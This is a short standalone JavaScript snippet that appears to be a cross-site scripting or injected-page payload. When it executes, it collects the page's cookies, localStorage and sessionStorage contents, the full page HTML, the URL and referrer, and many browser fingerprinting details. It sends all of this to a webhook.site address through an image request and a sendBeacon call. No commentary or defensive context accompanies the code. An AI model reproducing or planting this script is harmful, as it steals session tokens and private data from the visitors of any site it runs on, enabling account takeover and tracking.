(function() {
  const webhook = 'https://webhook.site/4af52c09-667c-425f-9767-f20efcf8aef0';
  const data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    referrer: document.referrer,
    title: document.title,
    html: document.documentElement.outerHTML,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    maxTouchPoints: navigator.maxTouchPoints,
    screen: screen.width + 'x' + screen.height,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: new Date().getTimezoneOffset(),
    plugins: [].map.call(navigator.plugins, function(p) { return p.name; })
  };

  const payload = encodeURIComponent(JSON.stringify(data));
  new Image().src = webhook + '?data=' + payload;
  navigator.sendBeacon(webhook + '?data=' + payload);
})();
